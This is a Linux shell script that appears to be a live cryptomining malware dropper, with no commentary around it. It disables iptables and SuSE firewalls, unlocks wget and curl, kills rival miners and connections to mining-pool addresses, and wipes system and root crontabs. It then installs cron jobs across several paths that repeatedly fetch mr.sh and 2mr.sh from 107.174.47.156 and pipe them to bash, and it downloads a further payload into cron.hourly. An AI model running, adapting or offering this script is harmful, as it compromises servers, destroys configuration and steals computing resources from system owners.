#!/bin/sh
mkdir /var/tmp
touch /etc/ld.so.preload
chattr -i /usr/bin/wget
chmod 755 /usr/bin/wget
chattr -i /usr/bin/curl
chmod 755 /usr/bin/curl
/etc/init.d/iptables stop
service iptables stop
SuSEfirewall2 stop
reSuSEfirewall2 stop
pkill -f sysxlj
pkill -f jourxlv
pkill -f sustes
touch /etc/ld.so.preload
netstat -antp | grep '56415' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '139.99.120.75' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
rm -rf /usr/lib/void.so
rm -rf /etc/voidonce.sh
rm -rf /usr/local/lib/libjdk.so
rm -rf /usr/local/lib/libntp.so
ps aux|grep "I2NvZGluZzogdXRmLTg"|grep -v grep|awk '{print $2}'|xargs kill -9
sed -i '$d' /etc/crontab
rm -rf /lib64/library1.so
rm -rf /usr/lib64/library1.so
iptables -I OUTPUT -s 167.99.166.61 -j DROP
iptables -I INPUT -s 167.99.166.61 -j DROP
iptables -I OUTPUT -p tcp -m string --string "pastebin" --algo bm -j DROP
iptables -I OUTPUT -p udp -m string --string "pastebin" --algo kmp -j DROP
rm -rf /etc/cron.monthly/oanacroner  
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.hourly/oanacroner
rm -rf /usr/local/bin/dns
echo "" > /etc/crontab
echo "" > /etc/cron.d/root
echo "" > /etc/cron.d/apache
echo "" > /var/spool/cron/root
echo "" > /var/spool/cron/crontabs/root
chkconfig --del netdns
pkill -f netdns
echo "" > /etc/cron.d/system
chmod 777 /var/tmp
rm -rf /usr/local/bin/dns
rm -rf /usr/sbin/netdns
rm -rf /etc/init.d/netdns
rm -rf /etc/cron.monthly/oanacroner  
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.hourly/oanacroner
chattr -i /usr/local/lib/libntpd.so
chmod 777 /usr/local/lib/libntpd.so
rm -rf /usr/local/lib/libntpd.so
sed -i '/libntpd.so/d'  /etc/ld.so.preload
crontab -l | sed '/pastebin.com/d' | crontab -
netstat -antp | grep '27.155.87.59' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '27.155.87.59' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'CLOSE_WAIT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
pkill -f /usr/bin/.sshd
netstat -antp | grep '202.144.193.110:3333'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
rm -rf /var/tmp/j*
rm -rf /tmp/j*
rm -rf /var/tmp/java
rm -rf /tmp/java
rm -rf /var/tmp/java2
rm -rf /tmp/java2
rm -rf /var/tmp/java*
rm -rf /tmp/java*
chattr -i /usr/lib/libiacpkmn.so.3 && rm -rf /usr/lib/libiacpkmn.so.3
chattr -i /etc/init.d/nfstruncate && rm -rf /etc/init.d/nfstruncate
rm -rf /etc/rc.d/rc*.d/S01nfstruncate /bin/nfstruncate
rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
rm -rf /tmp/*index_bak*
rm -rf /tmp/*httpd.conf*
rm -rf /tmp/*httpd.conf
echo -e "*/1 * * * * root (curl -s http://107.174.47.156/mr.sh||wget -q -O - http://107.174.47.156/mr.sh)|bash -sh\n##" > /etc/cron.d/root
echo -e "*/2 * * * * root (curl -s http://107.174.47.156/mr.sh||wget -q -O - http://107.174.47.156/mr.sh)|bash -sh\n##" > /etc/cron.d/apache
echo -e "*/30 * * * *	(curl -s http://107.174.47.156/mr.sh||wget -q -O - http://107.174.47.156/mr.sh)|bash -sh\n##" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo -e "* * * * *	(curl -s http://107.174.47.156/mr.sh||wget -q -O - http://107.174.47.156/mr.sh)|bash -sh\n##" > /var/spool/cron/crontabs/root
mkdir -p /etc/cron.hourly
(curl -fsSL --connect-timeout 120 http://107.174.47.156/11 -o /etc/cron.hourly/oanacroner1||http://107.174.47.156/11 -O /etc/cron.hourly/oanacroner1) && chmod 755 /etc/cron.hourly/oanacroner1
rm -rf /tmp/a7b104c270
rm -rf /tmp/.uninstall* /tmp/.python* /tmp/.tables* /tmp/.mas
rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
chmod 777 /var/tmp/sustse
ps aux | grep -vw 'kworkerds\|sustse' | awk '{if($3>30.0) print $2}' | while read procid
do
kill -9 $procid
done
ps ax | grep /tmp/ | grep -v grep | grep -v 'kworkerds\|sustse\|kworkerds\|sustse\|ppl' | awk '{print $1}' | xargs kill -9
ps ax | grep 'wc.conf\|wq.conf\|wm.conf' | grep -v grep | grep -v 'kworkerds\|sustse\|kworkerds\|sustse\|ppl' | awk '{print $1}' | xargs kill -9
netstat -ant|grep '185.161.70.34:3333\|202.144.193.184:3333\|205.185.122.99:3333'|grep 'ESTABLISHED'|grep -v grep
if [ $? -eq 0 ]
then
pwd
else
curl -s http://107.174.47.156/2mr.sh | bash -sh || wget -q -O - http://107.174.47.156/2mr.sh | bash -sh
fi
sleep 2
if crontab -l | grep -q "107.174.47.156"
then
    echo "Cron exists"
else
    crontab -r
    echo "Cron not found"
    LDR="wget -q -O -"
    if [ -s /usr/bin/curl ];
    then
        LDR="curl";
    fi
    if [ -s /usr/bin/wget ];
    then
        LDR="wget -q -O -";
    fi
	(crontab -l 2>/dev/null; echo "* * * * * $LDR http://107.174.47.156/mr.sh | bash -sh > /dev/null 2>&1")| crontab -
fi
rm -rf /var/tmp/jrm
rm -rf /tmp/jrm
pkill -f 185.222.210.59
pkill -f 95.142.40.81
pkill -f 192.99.142.232
chmod 777 /var/tmp/sustse
crontab -l | sed '/185.222.210.59/d' | crontab -